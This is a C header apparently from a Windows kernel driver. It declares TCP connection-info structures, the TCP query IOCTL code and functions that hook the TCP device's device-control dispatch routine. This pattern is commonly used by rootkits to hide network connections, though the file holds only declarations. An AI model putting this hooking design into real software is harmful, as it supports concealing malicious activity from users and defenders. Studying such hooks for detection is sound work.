#ifndef _NET_STAT_H_
#define _NET_STAT_H_

#include "inc.h"
#include <tdiinfo.h>

#define IOCTL_TCP_QUERY_INFORMATION_EX 0x00120003 
//#define MAKEPORT(a, b)   ((WORD)(((UCHAR)(a))|((WORD)((UCHAR)(b))) << 8))
#define HTONS(a)  (((0xFF&a)<<8) + ((0xFF00&a)>>8)) 

typedef struct _CONNINFO101 {
	unsigned long status;
	unsigned long src_addr;
	unsigned short src_port;
	unsigned short unk1;
	unsigned long dst_addr;
	unsigned short dst_port;
	unsigned short unk2;
} CONNINFO101, * PCONNINFO101;

typedef struct _CONNINFO102 {
	unsigned long status;
	unsigned long src_addr;
	unsigned short src_port;
	unsigned short unk1;
	unsigned long dst_addr;
	unsigned short dst_port;
	unsigned short unk2;
	unsigned long pid;
} CONNINFO102, * PCONNINFO102;

typedef struct _CONNINFO110 {
	unsigned long size;
	unsigned long status;
	unsigned long src_addr;
	unsigned short src_port;
	unsigned short unk1;
	unsigned long dst_addr;
	unsigned short dst_port;
	unsigned short unk2;
	unsigned long pid;
	PVOID    unk3[35];
} CONNINFO110, * PCONNINFO110;

typedef struct CompletionRoutineContext {
	PIO_COMPLETION_ROUTINE  oldCompletion;
	PVOID                   oldContext;
	UCHAR                   oldControl;
	unsigned long           reqType;
} CompletionRoutineContext, * PCompletionRoutineContext;

PFILE_OBJECT pTcpFile;
PDEVICE_OBJECT pTcpDevice;
PDRIVER_OBJECT pTcpDriver;

PDRIVER_DISPATCH glRealIrpMjDeviceControl;



NTSTATUS InstallTCPDriverHook(WCHAR* wcTcpDeviceNameBuffer);

NTSTATUS HookTcpDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

#endif // !_NET_STAT_H_
